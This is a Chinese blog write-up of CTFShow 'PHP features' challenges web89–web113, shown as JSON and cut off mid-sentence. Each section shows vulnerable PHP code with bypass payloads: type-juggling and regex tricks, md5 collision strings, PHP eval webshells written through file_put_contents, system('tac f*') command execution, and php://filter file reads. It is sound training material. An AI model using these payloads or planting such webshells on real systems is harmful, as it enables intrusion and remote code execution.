{"title":"CTFShow-PHP特性","uid":"e17947ddc3397502a09c2214e5d9f847","slug":"PHP特性","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:09:31.440Z","comments":true,"path":"api/articles/PHP特性.json","keywords":null,"cover":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","content":"<h1 id=\"PHP特性\"><a href=\"#PHP特性\" class=\"headerlink\" title=\"PHP特性\"></a>PHP特性</h1><h2 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h2><p>利用数组进行绕过</p>\n<pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n</code></pre>\n<p><a href=\"https://www.runoob.com/php/php-intval-function.html\">intval函数</a></p>\n<p>如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p>\n<p>通过preg_match对num进行正则匹配，如果num是一个数，就会返回no no no</p>\n<pre><code>?num[]=1\n</code></pre>\n<h2 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n</code></pre>\n<pre><code>int intval ( mixed $var [, int $base = 10 ] )\n参数说明：\n\n$var：要转换成 integer 的数量值。\n$base：转化所使用的进制。\n</code></pre>\n<pre><code>intval($num,0)：\n如果 base 是 0，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n</code></pre>\n<pre><code>intval('4476.0')===4476    小数点  \nintval('+4476.0')===4476   正负号\nintval('4476e0')===4476    科学计数法\nintval('0x117c')===4476    16进制\nintval('010574')===4476    8进制\nintval(' 010574')===4476   8进制+空格\n</code></pre>\n<pre><code>因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=4476%23\n会转整形，从左向右看数字留下，字符就过\n</code></pre>\n<h2 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h2><p>正则表达式是匹配方法 <a href=\"https://blog.csdn.net/qq_46091464/article/details/108278486\">https://blog.csdn.net/qq_46091464/article/details/108278486</a> 可以通过 %0a 绕过 payload： abc%0aphp</p>\n<p>preg_match()</p>\n<pre><code>正则表达式中$\n匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 $。\n所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a)\n</code></pre>\n<pre><code>i \n不区分(ignore)大小写\n\nm\n多(more)行匹配\n若存在换行\\n并且有开始^或结束$符的情况下，\n将以换行为分隔符，逐行进行匹配\n$str = \"abc\\nabc\";\n$preg = \"/^abc$/m\";\npreg_match($preg, $str,$matchs);\n这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。\n\ns\n特殊字符圆点 . 中包含换行符\n默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符\n$str = \"abggab\\nacbs\";\n$preg = \"/b./s\";\npreg_match_all($preg, $str,$matchs);\n这样匹配到的有三个 bg b\\n bs\n\nA\n强制从目标字符串开头匹配;\n\nD\n如果使用$限制结尾字符,则不允许结尾有换行; \n\ne\n配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; \n</code></pre>\n<pre><code>?cmd=111%0aphp\n\n%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。\n经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag\n</code></pre>\n<h2 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n</code></pre>\n<p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 </p>\n<pre><code>intval('4476.0')===4476    小数点  \nintval('+4476.0')===4476   正负号\nintval('4476e0')===4476    科学计数法\nintval('0x117c')===4476    16进制\nintval('010574')===4476    8进制\nintval(' 010574')===4476   8进制+空格\n</code></pre>\n<p>==4476是若等于用4476%23就会直接nonono</p>\n<h2 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n</code></pre>\n<pre><code>intval('010574')===4476    8进制\n</code></pre>\n<h2 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n</code></pre>\n<pre><code>?num=4476.0\n</code></pre>\n<h2 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n</code></pre>\n<p>可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574</p>\n<pre><code>%2b010574在GET获取之前就decode了，就完全等价于+010574，GET获取的就是+\n</code></pre>\n<h2 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h2><pre><code>highlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n}\n</code></pre>\n<pre><code>highlight_file(filename,return)\n\nfilename\t必需。要进行高亮处理的 PHP 文件的路径。\nreturn\t可选。如果设置 true，则本函数返回高亮处理的代码。\n</code></pre>\n<pre><code>/?u=/var/www/html/flag.php              绝对路径\n/?u=./flag.php                          相对路径\n/?u=php://filter/resource=flag.php      php伪协议             \n</code></pre>\n<h2 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h2><p>MD5函数无法处理数组</p>\n<pre><code>MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。md5弱类型比较可以直接数组绕过，其结果都会转换为null，MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\n</code></pre>\n<pre><code>POST: a[]=1&amp;b[]=2\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221007234155004.png\" alt=\"image-20221007234155004\"></p>\n<p>如果进行了string强制转类型后，则不再接受数组</p>\n<p>弱碰撞：</p>\n<pre><code>$a=(string)$a;\n$b=(string)$b;\nif(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) ){\necho $flag;\n}\nmd5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。\npayload: a=QNKCDZO&amp;b=240610708\n</code></pre>\n<p>强碰撞：</p>\n<pre><code>$a=(string)$a;\n$b=(string)$b;\nif(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) ){\necho $flag;\n}\n这时候需要找到两个真正的md5值相同数据\n\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n</code></pre>\n<h2 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h2><pre><code>include(\"flag.php\");\n$_GET?$_GET=&amp;$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n?&gt;\n</code></pre>\n<p>发送一个GET请求，POST的值赋给GET，要是不发送GET的值为flag（GET和POST其实都是数组，COOKIE和SERVER也是），通过POST发送HTTP_SERVER的值flag</p>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008022747713.png\" alt=\"image-20221008022747713\"></p>\n<h2 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h2><pre><code>highlight_file(__FILE__);\n$allow = array();//设置为数组\nfor ($i=36; $i &lt; 0x36d; $i++) { \n    array_push($allow, rand(1,$i));//向数组里面插入随机数\n}\nif(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n?&gt;\n</code></pre>\n<pre><code>rand() 函数返回随机整数。\nisset() 函数用于检测变量是否已设置并且非 NULL。\narray_push() 向数组里面插入随机数\n\nin_array() \nin_array延用了php中的==\nin_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1\n\nfile_put_contents()把一个字符串写入文件中。\n如果文件不存在，将创建一个文件\n如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。\n</code></pre>\n<pre><code>?n=1.php\ncontent=&lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008025223554.png\" alt=\"image-20221008025223554\"></p>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008025242959.png\" alt=\"image-20221008025242959\"></p>\n<h2 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h2><pre><code>highlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n</code></pre>\n<p>运算符优先级，所以保证v1为数字就可以了</p>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008204704073.png\" alt=\"image-20221008204704073\"></p>\n<pre><code>反射类\nReflectionClass 类 ReflectionClass 类报告了一个类的有关信息。\n\n最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass('ctfshow');\npayload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n</code></pre>\n<pre><code>&lt;?php\nclass A{\npublic static $flag=\"flag{123123123}\";\nconst  PI=3.14;\nstatic function hello(){\n    echo \"hello&lt;/br&gt;\";\n}\n}\n$a=new ReflectionClass('A');\n\n\nvar_dump($a-&gt;getConstants());  获取一组常量\n输出\n array(1) {\n  [\"PI\"]=&gt;\n  float(3.14)\n}\n\nvar_dump($a-&gt;getName());    获取类名\n输出\nstring(1) \"A\"\n\nvar_dump($a-&gt;getStaticProperties()); 获取静态属性\n输出\narray(1) {\n  [\"flag\"]=&gt;\n  string(15) \"flag{123123123}\"\n}\n\nvar_dump($a-&gt;getMethods()); 获取类中的方法\n输出\narray(1) {\n  [0]=&gt;\n  object(ReflectionMethod)#2 (2) {\n    [\"name\"]=&gt;\n    string(5) \"hello\"\n    [\"class\"]=&gt;\n    string(1) \"A\"\n  }\n}\n</code></pre>\n<p>其他payload</p>\n<pre><code>直接输出$ctfshow;构造出 var_dump($ctfshow);\npayload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;\n\n\n直接输出$ctfshow;构造出 var_dump($ctfshow);\npayload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;\n/?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tac ctfshow.php`;  \n\n或者拼接\n/?v1=1&amp;v2=new%20Exception&amp;v3=;system(%27cat%20ctfshow.php%27);\n</code></pre>\n<pre><code>flag_is_124446aa0x2d2cf30x2d40e90x2dbe290x2d507c45cfa0fe\"]\n0x2d转换为-\nctfshow{124446aa-2cf3-40e9-be29-507c45cfa0fe}\n</code></pre>\n<h2 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h2><pre><code>highlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n</code></pre>\n<p>必须使用反射类</p>\n<pre><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\nflag_f7c086750x2d57210x2d415b0x2dbc460x2de0a24c97b36\n\nctfshow{f7c08675-5721-415b-bc46-e0a24c97b36}最后一段是11位但是应该是12位所以爆破\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008212012901.png\" alt=\"image-20221008212012901\"></p>\n<h2 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h2><pre><code>highlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<pre><code>substr(string,start,length)\nstring\t必需。规定要返回其中一部分的字符串。\nstart\t\n必需。规定在字符串的何处开始。\n\n正数 - 在字符串的指定位置开始\n负数 - 在从字符串结尾开始的指定位置开始\n0 - 在字符串中的第一个字符处开始\n\nlength\t\n可选。规定被返回字符串的长度。默认是直到字符串的结尾。\n\n正数 - 从 start 参数所在的位置返回的长度\n负数 - 从字符串末端返回的长度\n</code></pre>\n<pre><code>call_user_func 回调函数\nPHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。\n$str = call_user_func($v1,$s);就是将s作为v1函数的参数\n</code></pre>\n<pre><code>hex2bin 把十六进制值转换为 ASCII 字符：\n\n&lt;?php\necho hex2bin(\"48656c6c6f20576f726c6421\");\n?&gt;\n以上实例输出结果:\n\nHello World!\n</code></pre>\n<pre><code>payload\nv2必须是数字\nis_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的。\nvar_dump(is_numeric(\"0x66\"));  php5的环境下返回true  php7返回false\n\n之后经过截断我们就得到了16进制，而且是不带0x的，这时候就可以通过调用函数hex2bin将16进制转换成字符串从而写入木马文件。（hex2bin如果参数带0x会报错）\n\n&lt;?php eval($_POST[1]);?&gt;\n0x3c3f706870206576616c28245f504f53545b315d293b3f3e\n\n\nget:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php\npost:v1=hex2bin\n但是本地环境是php7，v2必须是数字，所以使用php伪协议用base64编码，再bin2hex，\n</code></pre>\n<p>利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：</p>\n<pre><code>直接参考payload\n$a='&lt;?=`cat *`;';\n$b=base64_encode($a);  // PD89YGNhdCAqYDs=\n$c=bin2hex($b);      //这里直接用去掉=的base64\n输出   5044383959474e6864434171594473\n\n?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin\n\n带e的话会被认为是科学计数法，可以通过is_numeric检测。\n大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008223553392.png\" alt=\"image-20221008223553392\"></p>\n<h2 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h2><pre><code>highlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n}\n\n?&gt;\n</code></pre>\n<pre><code>同上题\n\n?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin\n</code></pre>\n<h2 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h2><p>sha1与md5类似。都无法处理数组</p>\n<pre><code>highlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>1.可以直接v1=v2\n\n2.使用sha1漏洞，sha1函数处理不了数组，均将为false\n\n3.用科学计数法\nv1=aaK1STfY    //0e76658526655756207688271159624026011393\nv2=aaO8zKZF    //0e89257456677279068558073954252716165668\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008224129084.png\" alt=\"image-20221008224129084\"></p>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221008224201954.png\" alt=\"image-20221008224201954\"></p>\n<h2 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h2><pre><code>highlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='你还想要flag嘛？';\n$suces='既然你想要那给你吧！';\nforeach($_GET as $key =&gt; $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key =&gt; $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces);\n\n?&gt;\n</code></pre>\n<pre><code>die() 函数\ndie() 函数输出一条消息，并退出当前脚本。\n该函数是 exit() 函数的别名。\n</code></pre>\n<pre><code>GET /?suces=flag\nPOST flag=123&amp;error=suces\n\nforeach($_GET as $key =&gt; $value)\n    $key=suces $value=flag\n$$key=$$value\n    $suces=$flag//变量覆盖\nforeach($_POST as $key =&gt; $value)\n    $key=flag $value=123 =&gt; $flag=$123=&gt;$123为空，flag为空\n    $key=error $value=suces=&gt; $error=$suces=&gt;现在真正的flag 再error里\n    \n$_POST['flag']==$flag =&gt; 123==null\n执行die($error)，输出flag\n</code></pre>\n<pre><code>GET /?suces=flag&amp;flag=123\nPOST error=suces\n同理\n</code></pre>\n<h2 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h2><pre><code>highlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){\n        echo $flag;\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>1.数组\nPOST v1[]=1\nGET v2[]=2\n\n2.用科学计数法\nv1=aaK1STfY    //0e76658526655756207688271159624026011393\nv2=aaO8zKZF    //0e89257456677279068558073954252716165668\n</code></pre>\n<h2 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n}\n?&gt;\n</code></pre>\n<pre><code>parse_str() 函数把查询字符串解析到变量中。将字符串解析成多个变量\n\nparse_str ( string $encoded_string [, array &amp;$result ] ) : void\n如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。\n\n&lt;?php\nparse_str(\"name=Peter&amp;age=43\",$myArray);\nprint_r($myArray);\n?&gt;\n\n运行结果\nArray ( [name] =&gt; Peter [age] =&gt; 43 )\n\n$a='q=123&amp;p=456';\nparse_str($a,$b);\necho $b['q'];   //输出123\necho $b['p'];   //输出456\n</code></pre>\n<pre><code>payload\nv1=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值\nv3=1\n</code></pre>\n<h2 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h2><p>ereg %00正则截断</p>\n<pre><code>highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n}\n//只有36d的人才能看到flag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n?&gt;\n</code></pre>\n<pre><code>ereg()、eregi()，正则函数，可以使用preg_match()来替代\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配\n\n\nstrrev()反转字符串\n\n&lt;?php\necho strrev(\"I love Shanghai!\");\n?&gt;\n!iahgnahS evol I\n</code></pre>\n<pre><code>payload:c=a%00778\n首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。\n</code></pre>\n<h2 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类\n通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果\n\nReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射\n</code></pre>\n<pre><code>?v1=Exception&amp;v2=system(\"tac f*\")\n\n?v1=ReflectionClass&amp;v2=system(\"tac f*\")\n\n?v1=ReflectionMethod&amp;v2=system('tac f*')\n</code></pre>\n<h2 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n    eval(\"echo new $v1($v2());\");\n}\n?&gt;\n</code></pre>\n<pre><code>php内置类 \n利用FilesystemIterator 获取指定目录下的所有文件\ngetcwd()函数 获取当前工作目录 返回当前工作目录\n\npayload: ?v1=FilesystemIterator&amp;v2=getcwd\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221009223033733.png\" alt=\"image-20221009223033733\"></p>\n<h2 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&amp;$v1,&amp;$v2){\n    eval(\"$$v1 = &amp;$$v2;\");\n    var_dump($$v1);\n}\n\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>v1的值必是ctfshow\n\neval(\"$$v1 = &amp;$$v2;\");//将v2的值赋给v1\n\n$GLOBALS — 引用全局作用域中可用的全部变量\n\npayload：\n?v1=ctfshow&amp;v2=GLOBALS\n//把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出.\n</code></pre>\n<h2 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n</code></pre>\n<pre><code>is_file — 判断给定文件名是否为一个正常的文件\nis_file ( string $filename ) : bool\n</code></pre>\n<pre><code>要获取flag需要满足两个条件，不能让is_file检测是文件，并且highlight_file可以识别为文件，这时候可以利用php伪协议。\n\n可以直接用不带任何过滤器的filter伪协议\nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n\n\n?file=php://filter/resource=flag.php\n\n?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n\n?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php//可打印字符引用编码\n\n?file=compress.zlib://flag.php\t\t//压缩\n</code></pre>\n<h2 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h2><pre><code>highlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo 